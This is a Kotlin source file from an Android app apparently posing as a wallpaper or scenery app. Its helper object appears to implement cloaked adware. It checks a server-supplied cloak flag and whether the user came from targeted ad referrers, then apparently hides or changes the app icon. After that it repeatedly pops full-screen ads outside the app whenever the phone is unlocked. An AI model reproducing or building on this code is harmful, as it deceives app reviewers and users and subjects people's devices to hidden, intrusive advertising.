package com.wallsc.scrk.core

import android.os.Build
import com.wallsc.scrk.ScapeHelperM
import com.wallsc.scrk.listener.LifecycleActivityListener
import com.wallsc.scrk.open.ShuajService
import com.wallsc.scrk.open.FancyUser
import com.wallsc.scrk.open.bro.FancyBroadcastReceiver
import com.wallsc.scrk.open.bro.isCanBroadEvent
import com.wallsc.scrk.open.bro.mIntentFilter
import com.wallsc.scrk.other.ActivityLifeHelper
import com.wallsc.scrk.other.FancyAdFetch
import com.wallsc.scrk.other.info.FancySceneryConfigure
import com.wallsc.scrk.other.info.FancySceneryNetwork
import com.wallsc.scrk.other.info.SpFancy
import com.wallsc.scrk.other.info.mCloakInfo
import com.wallsc.scrk.tools.AppInfoTools
import com.wallsc.scrk.tools.FIntImpl
import com.wallsc.scrk.tools.FancyLog
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

/**
 * Date：2024/1/19
 * Describe:
 */

private var curProgress by FIntImpl(0, tag = "Progress")
private var fancyFailedNum by FIntImpl(0)

object FancySceneryHelper {
    var retryNum = fancyFailedNum
        set(value) {
            field = value
            fancyFailedNum = value
        }

    //都通过
    fun isProgressAllGo(): Boolean {
        if (curProgress == 100) return true
        return isProgress2Allow() && mCloakInfo == 10
    }

    fun isProgress2Allow(): Boolean {
        return FancyUser.isTargetUser() || SpFancy.isAdJUser()
    }

    private var mJob: Job? = null
    fun startCheck() {
        mJob?.cancel()
        mJob = CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
            val startTime = System.currentTimeMillis()
            while (true) {
                FancyLog.e("curProgress--->$curProgress")
                when (curProgress) {
                    0 -> {
                        if (FancySceneryConfigure.fancyCBean.isOpenS()) {
                            curProgress = 2
                            FancySceneryNetwork.postMai("issimer", isPost = true, retry = 18)
                            continue
                        }
                    }

                    "2".toInt() -> {
                        if (isProgress2Allow()) {
                            curProgress = 3
                            FancySceneryNetwork.postMai(
                                "isuser",
                                isPost = true,
                                retry = 8,
                                map = mapOf("getstring" to FancyUser.referrerTag)
                            )
                            continue
                        }
                    }

                    "3".toInt() -> {
                        if (mCloakInfo == 10) {
                            curProgress = 100
                            FancySceneryNetwork.postMai("ishit", isPost = true, retry = 12)
                            break
                        } else if (mCloakInfo == 5) {
                            FancyLog.e("mCloakInfo not allow")
                            withContext(Dispatchers.Main) {
                                ShuajService.closeMe(mApp)
                            }
                            mJob?.cancel()
                        }
                    }

                    else -> {
                        break
                    }
                }
                delay(2000)
            }
            withContext(Dispatchers.Main) {
                iconWait(startTime)
                FancyLog.e("--->>>> change")
                ScapeHelperM.shei(mApp, 0)
                registerTime()
            }
        }
    }

    private suspend fun iconWait(time: Long) {
        if (Build.VERSION.SDK_INT < 29) {
            return
        }
        while (true) {
            if (LifecycleActivityListener.isInBoot.not() && FancySceneryConfigure.fancyCBean.isIAllow()) {
                break
            }
            delay(4000)
        }
    }

    private var timeJob: Job? = null
    private fun registerTime() {
        mApp.registerReceiver(FancyBroadcastReceiver(), mIntentFilter)
        timeJob?.cancel()
        isCanBroadEvent = true
        timeJob = CoroutineScope(Dispatchers.Main).launch {
            delay(4000)
            while (true) {
                FancySceneryNetwork.postMai("time")
                fancyE()
                delay(FancySceneryConfigure.checkPeriodTime)
            }
        }
    }

    private fun isLimitP(): Boolean {
        if (retryNum > 140) {
            timeJob?.cancel()
            isCanBroadEvent = false
            FancySceneryNetwork.postMai("jumpfail", isPost = true)
            return true
        }
        return false
    }

    fun fancyE() {
        if (isLimitP()) return
        if (AppInfoTools.isPhoneO().not()) return
        FancySceneryNetwork.postMai("isunlock")
        if (ActivityLifeHelper.isAppRCheckAllow()) {
            if (FancySceneryConfigure.isFancyBeanAllow().not()) return
        } else {
            return
        }
        if (isFancyReady()) {
            retryNum++
            FancySceneryConfigure.showFancyAdTime = System.currentTimeMillis()
            CoroutineScope(Dispatchers.IO).launch {
                delay(LifecycleActivityListener.getDelayTimeA())
                //外弹
                ScapeHelperM.shei(mApp, 2)
            }
        }
    }

    private fun isFancyReady(): Boolean {
        if (FancyAdFetch.isReadyAd()) {
            isNeedNow = false
            FancySceneryNetwork.postMai("isready")
            return true
        } else {
            FancyAdFetch.load()
            isNeedNow = true
            return false
        }
    }

    private var isNeedNow = false

    fun eventNow() {
        if (isNeedNow) {
            fancyE()
        }
    }

}